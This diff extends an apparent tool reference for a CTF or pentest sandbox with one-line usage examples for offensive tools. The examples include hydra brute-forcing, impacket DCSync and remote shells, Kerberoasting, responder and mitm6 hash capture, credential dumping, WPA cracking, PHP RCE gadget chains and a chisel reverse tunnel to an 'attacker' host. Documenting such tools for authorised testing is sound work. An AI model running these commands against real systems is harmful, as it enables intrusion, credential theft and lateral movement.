@@ -7,11 +7,32 @@ nc (netcat)        TCP/UDP connections. nc host port <<'EOF' for heredoc session
 curl               HTTP client. -s silent, -k skip TLS, -d data, -H header.
 wget               HTTP download. wget -O file url.
 nmap               Port scanner. nmap -sV host, nmap -p- host.
+masscan            Wide-net port sweeps (faster than nmap for /16+).
+                   masscan 10.0.0.0/8 -p1-65535 --rate 10000.
+ssh / sshpass      OpenSSH client + non-interactive password auth.
+                   sshpass -p guest ssh -o StrictHostKeyChecking=no user@host -p2222.
+dig / nslookup     DNS lookups (dnsutils).
+whois              WHOIS lookups.
+dnsrecon           DNS recon: zone transfers, brute-force, reverse.
+                   dnsrecon -d example.com -t std,axfr.
+onesixtyone        SNMP scanner. onesixtyone -c community.txt 10.0.0.1
+snmpwalk           SNMP walker. snmpwalk -v2c -c public host.
+proxychains4       Pivot through socks/http chain.
+                   proxychains4 -f /etc/proxychains4.conf nmap target.
+chisel-pivot       HTTP-tunneled pivot (jpillora/chisel). On attacker:
+                   chisel-pivot server -p 8080 --reverse.
+                   On target: chisel-pivot client attacker:8080 R:1080:socks.
+mosquitto-clients  MQTT pub/sub. mosquitto_sub -h host -t '#' -v.
 
 == WEB PENTESTING ==
 ffuf               Fast web fuzzer. ffuf -u http://t/FUZZ -w /opt/wordlists/common.txt
                    Param fuzzing: ffuf -u 'http://t/?FUZZ=x' -w wordlist
                    VHost: ffuf -u http://t/ -H 'Host: FUZZ.t' -w wordlist -fs 0
+gobuster           Alternative dir buster. gobuster dir -u http://t -w wordlist.
+feroxbuster        Recursive Rust dir buster. feroxbuster -u http://t -w wordlist.
+wfuzz              Versatile fuzzer with payload chaining.
+whatweb            Tech fingerprinting. whatweb http://t.
+nikto              Basic web vuln scanner. nikto -h http://t.
 sqlmap             Automated SQL injection. sqlmap -u 'http://t/?id=1' --batch --dbs
                    POST: sqlmap -u 'http://t/login' --data 'u=a&p=b' --batch
 nuclei             Template-based vuln scanner. nuclei -u http://t -severity high,critical
@@ -122,6 +143,8 @@ patchelf           Set interpreter / rpath on a target binary so it loads the
                    challenge-supplied libc. patchelf --set-interpreter ./ld-2.31.so bin
 pwninit            One-shot pwn-challenge prep: detects libc version, downloads
                    matching ld.so, patches the binary. pwninit (in challenge dir).
+seccomp-tools      Dump SECCOMP filters from a binary (jail/sandbox challenges).
+                   seccomp-tools dump ./binary, seccomp-tools emu policy.txt.
 
 == FUZZING ==
 afl++              Coverage-guided fuzzer. Compile with afl-cc; harness with afl-fuzz.
@@ -200,8 +223,10 @@ RsaCtfTool         Automated RSA attacks. RsaCtfTool -n N -e E --attack all
 sage               SageMath CAS. sage -c 'from sage.all import *; print(factor(n))'
                    ECM factoring: sage -c 'from sage.all import *; print(ecm.factor(n))'
                    LLL lattice: sage -c 'M=matrix(ZZ,[...]); print(M.LLL())'
+gp / pari-gp       PARI/GP number-theory CLI (faster than sage for some ops).
 cado-nfs           Number Field Sieve (large factoring/DLP). cado-nfs <N>
 flatter            Fast LLL lattice reduction. flatter < input_matrix
+hashid             Identify hash type. hashid '<hash>'.
 
 == PASSWORD CRACKING ==
 hashcat            GPU/CPU hash cracker. POCL CPU runtime is installed so it
@@ -211,7 +236,102 @@ hashcat            GPU/CPU hash cracker. POCL CPU runtime is installed so it
                      hashcat --help | grep -i <algo>                      # find -m
 john               John the Ripper. john --wordlist=/opt/wordlists/rockyou.txt hash.txt
                    Format autodetect; --format=descrypt etc. for hints.
+hydra              Online password brute-force (SSH/FTP/HTTP/SMB/etc.).
+                   hydra -l user -P /opt/wordlists/rockyou.txt ssh://target.
+ncrack             Alternative online cracker; better for some protocols.
+crunch             Wordlist generator. crunch 4 6 abc123 -o list.txt.
+cewl               Custom wordlist from a webpage. cewl http://t -w site.txt.
 jwt_tool           See WEB PENTESTING — also cracks HS256 secrets.
+
+== ACTIVE DIRECTORY / SMB / WINDOWS ==
+smbclient          Interactive SMB. smbclient -L //host -N (anon list shares).
+enum4linux         SMB/AD enumeration. enum4linux -a host.
+impacket-*         Toolkit. impacket-secretsdump DOMAIN/u:p@host (DCSync),
+                   impacket-psexec / wmiexec / smbexec (post-creds shell),
+                   impacket-GetNPUsers (AS-REP roast),
+                   impacket-GetUserSPNs (Kerberoast),
+                   impacket-ntlmrelayx (relay attacks).
+netexec (cme)      Multi-protocol AD pentest CLI (formerly crackmapexec).
+                   netexec smb host -u user -p pass --shares.
+kerbrute           Kerberos pre-auth user enum + password spray.
+                   kerbrute userenum -d domain users.txt --dc dc.host.
+evil-winrm         PowerShell over WinRM. evil-winrm -i host -u user -p pass.
+responder          LLMNR/NBT-NS/mDNS poisoner.
+                   responder -I eth0 -wd (capture NTLMv2 hashes).
+mitm6              IPv6 DHCP takeover (pairs with ntlmrelayx).
+                   mitm6 -d domain.local.
+pypykatz           Python-only mimikatz alternative (memory-dump credential
+                   extraction). pypykatz lsa minidump dump.dmp.
+gpp-decrypt        Group Policy Preferences password decryption.
+bloodhound-py      AD pathfinding collector (server is heavy; collector is
+                   enough). bloodhound-python -u user -p pass -d domain -c All.
+
+== PRIVESC ENUMERATION ==
+linpeas            Linux privesc enum (/opt/peas/linpeas.sh). bash linpeas.
+winpeas            Windows variants in /opt/peas/winpeas.{exe,bat,ps1}.
+                   Run winpeas.exe on target; results in stdout/colored.
+pspy32 / pspy64    Snoop process/cron without root. /opt/peas/pspy64.
+
+== PIVOTING ==
+chisel-pivot       See NETWORKING (jpillora/chisel). HTTP-tunnel SOCKS.
+proxychains4       See NETWORKING.
+sshpass            See NETWORKING.
+
+== EXPLOIT DATABASE ==
+searchsploit       Offline exploit-db lookup. searchsploit kernel 4.4
+                   (use --update for fresh CVE entries).
+
+== OSINT ==
+theHarvester       Subdomains/emails/hosts from public sources.
+                   theHarvester -d example.com -b all.
+recon-ng           Modular recon framework. recon-ng (interactive); workspaces +
+                   modules — `marketplace install` to add modules.
+sherlock           Username search across social platforms.
+                   sherlock <username>.
+photon             Fast crawler (scrape URLs, JS, secrets).
+                   photon -u http://t -o out.
+subfinder          Passive subdomain enum. subfinder -d example.com.
+httpx              HTTP probe / fingerprint at scale.
+                   subfinder -d example.com | httpx -silent -title.
+gau / waybackurls  See WEB PENTESTING — historical URL discovery.
+
+== WIRELESS ==
+aircrack-ng        WPA/WEP cracking suite.
+                   aircrack-ng handshake.cap -w /opt/wordlists/rockyou.txt.
+                   airodump-ng (capture), aireplay-ng (deauth) — need monitor mode.
+reaver             WPS attack. reaver -i mon0 -b <bssid>.
+
+== CLOUD ==
+aws (awscli)       AWS CLI. aws s3 ls, aws sts get-caller-identity, etc.
+                   Configure via env: AWS_ACCESS_KEY_ID/AWS_SECRET_ACCESS_KEY.
+cloudfox           Multi-cloud enumeration (BishopFox).
+                   cloudfox aws all-checks --profile default.
+prowler             AWS / Azure / GCP audit framework.
+                   prowler aws --checks ec2_instance_public_ip.
+
+== DESERIALIZATION (continued) ==
+phpggc             PHP gadget-chain generator (PHP analog of ysoserial).
+                   phpggc Laravel/RCE1 'system' 'id'.
+                   List chains: phpggc -l.
+
+== FIRMWARE EXTRACTION ==
+binwalk            See BINARY ANALYSIS.
+sasquatch          Patched unsquashfs that handles non-standard SquashFS
+                   (most IoT firmware uses non-vanilla offsets/algorithms).
+                   sasquatch firmware.bin.
+jefferson          JFFS2 filesystem extractor.
+                   jefferson firmware.jffs2 -d out/.
+ubi_reader         UBI/UBIFS extractor. ubireader_extract_files firmware.ubi.
+
+== LUA REVERSING ==
+unluac             Lua 5.1-5.4 bytecode decompiler. unluac compiled.luac > out.lua.
+
+== AI / LLM SECURITY ==
+art (Python)       Adversarial Robustness Toolbox.
+                   from art.attacks.evasion import FastGradientMethod.
+                   Adversarial examples / model evasion / extraction.
+garak              LLM red-teaming. garak --model_type huggingface --model_name <m>
+                   --probes <probe> — prompt-injection / jailbreak / data-exfil.
 
 == SMART CONTRACTS ==
 forge / cast / anvil / chisel
@@ -227,9 +347,16 @@ web3 (Python)      from web3 import Web3; w3 = Web3(Web3.HTTPProvider('...'))
 jadx               See DECOMPILERS.
 apktool            APK resource decoder/repackager. apktool d app.apk -o out/
                    Edit smali/, then apktool b out/ -o new.apk
+aapt               Android Asset Packaging Tool. aapt dump badging app.apk
+                   (manifest summary), aapt dump xmltree app.apk AndroidManifest.xml.
 d2j-dex2jar        Convert .dex/.apk → .jar (then read with jadx/javap).
                    d2j-dex2jar app.apk -o app.jar
-objection          Frida wrapper for runtime mobile pentesting. objection -g <pkg> explore
+androguard         Python static-analysis lib.
+                   from androguard.misc import AnalyzeAPK; a, d, dx = AnalyzeAPK('app.apk')
+                   Useful for permission/cert/string mining at scale.
+objection          Frida wrapper for runtime mobile pentesting. Needs a live
+                   Android target — no emulator in this sandbox; objection -g <pkg> explore.
+drozer             Android security assessment framework (also needs a target).
 
 == JVM / JAVA ==
 javac / java       OpenJDK compiler/runtime (default-jdk).
